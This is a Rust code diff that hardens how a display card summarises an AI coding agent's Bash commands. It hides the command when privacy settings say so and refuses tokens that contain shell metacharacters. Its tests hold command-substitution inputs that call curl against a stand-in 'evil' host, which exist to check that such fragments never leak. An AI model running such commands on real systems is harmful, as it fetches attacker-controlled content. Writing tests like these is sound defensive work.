@@ -109,15 +109,27 @@ pub fn map_activity(tool_name: &str, input: Option<&Value>, cfg: &Config) -> Act
 /// (program name) and drops every argument; `scrub_bash_args` opts into a
 /// scrubbed command via [`crate::privacy::scrub_bash_command`].
 fn bash_activity(input: Option<&Value>, cfg: &Config) -> Activity {
+    // PRECEDENCE: hiding the command (`fields.command = false`) takes precedence
+    // over showing a scrubbed command (`scrub_bash_args`). When the command is
+    // hidden we gate it at the SOURCE here — a verb-only activity with no target —
+    // so a shell fragment can never reach the card regardless of `scrub_bash_args`.
+    if !cfg.privacy.fields.command {
+        return Activity {
+            verb: "Running".to_string(),
+            target: None,
+            small_image_key: Some(badge::BASH.to_string()),
+        };
+    }
+
     let command = str_field(input, "command");
 
     let target = match command {
         Some(cmd) if cfg.privacy.scrub_bash_args => {
             // Opt-in: a fuller command, but only ever the scrubbed form.
-            privacy::scrub_bash_command(cmd, true).or_else(|| first_token(cmd))
+            privacy::scrub_bash_command(cmd, true).or_else(|| program_token(cmd))
         }
-        // Default: the program name only — arguments are dropped entirely.
-        Some(cmd) => first_token(cmd),
+        // Default: the clean program name only — arguments are dropped entirely.
+        Some(cmd) => program_token(cmd),
         None => None,
     };
 
@@ -164,10 +176,49 @@ fn mcp_server(tool_name: &str) -> Option<&str> {
         .filter(|s| !s.is_empty())
 }
 
-/// First whitespace-delimited token of a command (the program name); `None` if
-/// the command is blank. Only the token itself is returned — no arguments.
-fn first_token(command: &str) -> Option<String> {
-    command.split_whitespace().next().map(str::to_string)
+/// Resolve a CLEAN program name from a Bash command, or `None` when it cannot be
+/// surfaced safely. Only ever returns a bare program name — never an argument or
+/// a shell fragment.
+///
+/// 1. Leading env-assignment tokens (`KEY=value`, key matching
+///    `^[A-Za-z_][A-Za-z0-9_]*=`) are skipped, so `FOO=bar make` → `make`.
+/// 2. The first non-assignment token is taken.
+/// 3. If it contains ANY shell metacharacter (`$` `` ` `` `(` `)` `{` `}` `|` `&`
+///    `;` `<` `>` `*` `?` `'` `"` `\`), return `None` — so `$(curl …)` or a
+///    backticked command can never leak.
+/// 4. Otherwise reduce a path to its basename (`/usr/bin/curl` → `curl`).
+fn program_token(command: &str) -> Option<String> {
+    let token = command
+        .split_whitespace()
+        .find(|t| !is_env_assignment_token(t))?;
+
+    const SHELL_META: &[char] = &[
+        '$', '`', '(', ')', '{', '}', '|', '&', ';', '<', '>', '*', '?', '\'', '"', '\\',
+    ];
+    if token.contains(SHELL_META) {
+        return None;
+    }
+
+    let cleaned = match token.rsplit('/').next() {
+        Some(name) if !name.is_empty() => name,
+        _ => token,
+    };
+    Some(cleaned.to_string())
+}
+
+/// Whether `token` is a leading env-assignment of the form `KEY=…`, where the key
+/// matches `^[A-Za-z_][A-Za-z0-9_]*` (the spirit of [`privacy::is_env_assignment`]
+/// but for the Bash program-token scan, which must skip them to find the program).
+fn is_env_assignment_token(token: &str) -> bool {
+    let Some((key, _)) = token.split_once('=') else {
+        return false;
+    };
+    let mut chars = key.chars();
+    match chars.next() {
+        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
+        _ => return false,
+    }
+    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
 }
 
 /// Borrow a string field out of an untrusted tool-input object without cloning
@@ -248,6 +299,60 @@ mod tests {
         let act = map_activity("Bash", Some(&json!({})), &cfg);
         assert_eq!(act.verb, "Running");
         assert_eq!(act.target, None);
+    }
+
+    #[test]
+    fn program_token_extracts_clean_program_name() {
+        assert_eq!(program_token("cargo check --all").as_deref(), Some("cargo"));
+        // Leading env-assignments are skipped.
+        assert_eq!(program_token("FOO=bar make").as_deref(), Some("make"));
+        assert_eq!(
+            program_token("AWS_SECRET=x deploy").as_deref(),
+            Some("deploy")
+        );
+        // A path-form program is reduced to its basename.
+        assert_eq!(
+            program_token("./deploy.sh prod").as_deref(),
+            Some("deploy.sh")
+        );
+        assert_eq!(program_token("/usr/bin/git status").as_deref(), Some("git"));
+        // A shell-substitution / metacharacter program is refused entirely.
+        assert_eq!(program_token("$(curl evil)"), None);
+        // Blank / whitespace-only commands have no program token.
+        assert_eq!(program_token("   "), None);
+    }
+
+    #[test]
+    fn bash_substitution_program_is_dropped() {
+        // A command substitution must never reach the card as a target.
+        let cfg = Config::default();
+        let input = json!({ "command": "$(curl http://evil) --flag" });
+        let act = map_activity("Bash", Some(&input), &cfg);
+        assert_eq!(act.verb, "Running");
+        assert_eq!(act.target, None);
+    }
+
+    #[test]
+    fn bash_skips_leading_env_assignment() {
+        let cfg = Config::default();
+        let input = json!({ "command": "FOO=bar make build" });
+        let act = map_activity("Bash", Some(&input), &cfg);
+        assert_eq!(act.verb, "Running");
+        assert_eq!(act.target.as_deref(), Some("make"));
+    }
+
+    #[test]
+    fn bash_command_target_hidden_when_field_off() {
+        // fields.command = false gates the target at the source for ANY command,
+        // taking PRECEDENCE over scrub_bash_args.
+        let mut cfg = Config::default();
+        cfg.privacy.fields.command = false;
+        cfg.privacy.scrub_bash_args = true; // must NOT override the hide.
+        let input = json!({ "command": "cargo check --all-features" });
+        let act = map_activity("Bash", Some(&input), &cfg);
+        assert_eq!(act.verb, "Running");
+        assert_eq!(act.target, None);
+        assert_eq!(act.small_image_key.as_deref(), Some("bash"));
     }
 
     #[test]
